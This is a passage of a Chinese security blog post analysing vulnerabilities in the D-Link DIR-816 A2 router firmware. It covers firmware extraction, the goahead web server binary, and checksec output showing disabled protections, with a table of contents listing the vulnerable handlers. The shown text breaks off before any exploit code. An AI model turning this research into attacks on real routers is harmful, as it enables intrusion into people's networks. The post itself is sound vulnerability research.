<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="笔者在研究D-Link Dir-816 A2时发现了许多漏洞（挖到的漏洞均已提交cve，除了已经披露的），这里笔者仅写poc，exp可能会额外的写  D-Link Dir-816 A2路由器漏洞分析固件下载及提取文件固件下载地址：https://tsd.dlink.com.tw/ddgo   筛选到Firmware: DIR-816_A2_FW_v1.10 (for DCN)即可。将下载的img">
<meta property="og:type" content="article">
<meta property="og:title" content="D-Link Dir-816 A2路由器漏洞分析">
<meta property="og:url" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="笔者在研究D-Link Dir-816 A2时发现了许多漏洞（挖到的漏洞均已提交cve，除了已经披露的），这里笔者仅写poc，exp可能会额外的写  D-Link Dir-816 A2路由器漏洞分析固件下载及提取文件固件下载地址：https://tsd.dlink.com.tw/ddgo   筛选到Firmware: DIR-816_A2_FW_v1.10 (for DCN)即可。将下载的img">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/1.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/2.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/3.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/23.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/4.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/5.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/6.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/7.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/21.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/22.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/8.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/9.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/10.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/11.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/12.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/13.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/14.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/15.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/16.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/17.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/18.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/19.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/2o.png">
<meta property="og:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/20.png">
<meta property="article:published_time" content="2022-07-28T10:06:53.000Z">
<meta property="article:modified_time" content="2023-08-17T06:30:10.164Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>D-Link Dir-816 A2路由器漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="z1r0's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/08/29/CVE-2022-37133%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;text=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;is_video=false&amp;description=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=D-Link Dir-816 A2路由器漏洞分析&amp;body=Check out this article: https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;title=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;name=D-Link Dir-816 A2路由器漏洞分析&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/&amp;t=D-Link Dir-816 A2路由器漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">D-Link Dir-816 A2路由器漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">固件下载及提取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#goahead-main%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">goahead main程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineInternet"><span class="toc-number">1.3.</span> <span class="toc-text">formDefineInternet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addassignment"><span class="toc-number">1.3.1.</span> <span class="toc-text">addassignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#editassignment"><span class="toc-number">1.3.2.</span> <span class="toc-text">editassignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Wan-cgi"><span class="toc-number">1.3.3.</span> <span class="toc-text">form2Wan.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setMac"><span class="toc-number">1.3.4.</span> <span class="toc-text">setMac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addRouting"><span class="toc-number">1.3.5.</span> <span class="toc-text">addRouting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setNetworkLan"><span class="toc-number">1.3.6.</span> <span class="toc-text">setNetworkLan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Dhcpip-cgi"><span class="toc-number">1.3.7.</span> <span class="toc-text">form2Dhcpip.cgi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineUtilities"><span class="toc-number">1.4.</span> <span class="toc-text">formDefineUtilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2Reboot-cgi"><span class="toc-number">1.4.1.</span> <span class="toc-text">form2Reboot.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doReboot"><span class="toc-number">1.4.2.</span> <span class="toc-text">doReboot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form-define-ip-control"><span class="toc-number">1.5.</span> <span class="toc-text">form_define_ip_control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2IPQoSTcAdd"><span class="toc-number">1.5.1.</span> <span class="toc-text">form2IPQoSTcAdd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineFirewall"><span class="toc-number">1.6.</span> <span class="toc-text">formDefineFirewall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#websHostFilter"><span class="toc-number">1.6.1.</span> <span class="toc-text">websHostFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websURLFilter"><span class="toc-number">1.6.2.</span> <span class="toc-text">websURLFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websURLFilterAddDel"><span class="toc-number">1.6.3.</span> <span class="toc-text">websURLFilterAddDel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formDefineManagement"><span class="toc-number">1.7.</span> <span class="toc-text">formDefineManagement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#form2userconfig-cgi"><span class="toc-number">1.7.1.</span> <span class="toc-text">form2userconfig.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setSysAdm"><span class="toc-number">1.7.2.</span> <span class="toc-text">setSysAdm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form2systime-cgi"><span class="toc-number">1.7.3.</span> <span class="toc-text">form2systime.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTPSyncWithHost"><span class="toc-number">1.7.4.</span> <span class="toc-text">NTPSyncWithHost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DDNS"><span class="toc-number">1.7.5.</span> <span class="toc-text">DDNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formLogin"><span class="toc-number">1.7.6.</span> <span class="toc-text">formLogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemCommand"><span class="toc-number">1.7.7.</span> <span class="toc-text">SystemCommand</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadDefaultSettings"><span class="toc-number">1.7.8.</span> <span class="toc-text">LoadDefaultSettings</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Diagnosis"><span class="toc-number">1.7.9.</span> <span class="toc-text">Diagnosis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wizard-end"><span class="toc-number">1.7.10.</span> <span class="toc-text">wizard_end</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        D-Link Dir-816 A2路由器漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-07-28T10:06:53.000Z" itemprop="datePublished">2022-07-28</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/IOT/" rel="tag">IOT</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>笔者在研究D-Link Dir-816 A2时发现了许多漏洞（挖到的漏洞均已提交cve，除了已经披露的），这里笔者仅写poc，exp可能会额外的写</p>
</blockquote>
<h1 id="D-Link-Dir-816-A2路由器漏洞分析"><a href="#D-Link-Dir-816-A2路由器漏洞分析" class="headerlink" title="D-Link Dir-816 A2路由器漏洞分析"></a>D-Link Dir-816 A2路由器漏洞分析</h1><h2 id="固件下载及提取文件"><a href="#固件下载及提取文件" class="headerlink" title="固件下载及提取文件"></a>固件下载及提取文件</h2><p>固件下载地址：<a target="_blank" rel="noopener" href="https://tsd.dlink.com.tw/ddg">https://tsd.dlink.com.tw/ddgo</a></p>
<img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/1.png" style="zoom:50%;">

<p>筛选到<code>Firmware: DIR-816_A2_FW_v1.10 (for DCN)</code>即可。将下载的img到这个<a target="_blank" rel="noopener" href="https://zhiwanyuzhou.com/multiple_analyse/firmware/">网址</a>去解包就行，然后解包所有文件下载，之后tar解压出来即可看到文件系统。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:<span class="number">57</span>:<span class="number">35</span> z1r0@z1r0deMacBook-Pro.local squashfs-root l</span><br><span class="line">total <span class="number">0</span></span><br><span class="line">drwxr-xr-x@ <span class="number">17</span> z1r0  staff   <span class="number">544B</span>  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> .</span><br><span class="line">drwxr-xr-x   <span class="number">9</span> z1r0  staff   <span class="number">288B</span>  <span class="number">6</span> <span class="number">16</span> <span class="number">16</span>:<span class="number">43</span> ..</span><br><span class="line">drwxr-xr-x@ <span class="number">63</span> z1r0  staff   <span class="number">2.0</span>K  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> bin</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> z1r0  staff    <span class="number">96B</span>  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> dev</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> z1r0  staff    <span class="number">96B</span>  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> etc</span><br><span class="line">drwxr-xr-x@ <span class="number">15</span> z1r0  staff   <span class="number">480B</span>  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> etc_ro</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> z1r0  staff    <span class="number">96B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> home</span><br><span class="line">lrwxr-xr-x@  <span class="number">1</span> z1r0  staff    <span class="number">11B</span>  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> init -&gt; bin/busybox</span><br><span class="line">drwxr-xr-x@ <span class="number">44</span> z1r0  staff   <span class="number">1.4</span>K  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> lib</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> media</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> mnt</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> proc</span><br><span class="line">drwxr-xr-x@ <span class="number">71</span> z1r0  staff   <span class="number">2.2</span>K  <span class="number">3</span>  <span class="number">7</span>  <span class="number">2017</span> sbin</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> sys</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> tmp</span><br><span class="line">drwxr-xr-x@  <span class="number">5</span> z1r0  staff   <span class="number">160B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> usr</span><br><span class="line">drwxr-xr-x@  <span class="number">2</span> z1r0  staff    <span class="number">64B</span>  <span class="number">3</span>  <span class="number">2</span>  <span class="number">2017</span> var</span><br></pre></td></tr></tbody></table></figure>

<h2 id="goahead-main程序分析"><a href="#goahead-main程序分析" class="headerlink" title="goahead main程序分析"></a>goahead main程序分析</h2><p>使用nmap扫描可以发现在80端口上运行着goahead服务，<code>goahead</code> 自身实现了一个 <code>web</code> 服务器所需提供的基本功能，用户可以根据自身接口开发出各种各样的功能。所以我们分析的重点不是<code>goahead</code> 本身的代码，而是用户自定义的那些代码。</p>
<img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/2.png" style="zoom:50%;">

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:<span class="number">57</span>:<span class="number">36</span> z1r0@z1r0deMacBook-Pro.local squashfs-root find . -name goahead</span><br><span class="line">./bin/goahead</span><br></pre></td></tr></tbody></table></figure>

<p>find搜索之后发现在bin目录下，checksec之后发现是<code>mips-32-little</code>的程序，并且保护全关</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     mips<span class="number">-32</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></tbody></table></figure>

<p>将它放入ida中进行逆向分析</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 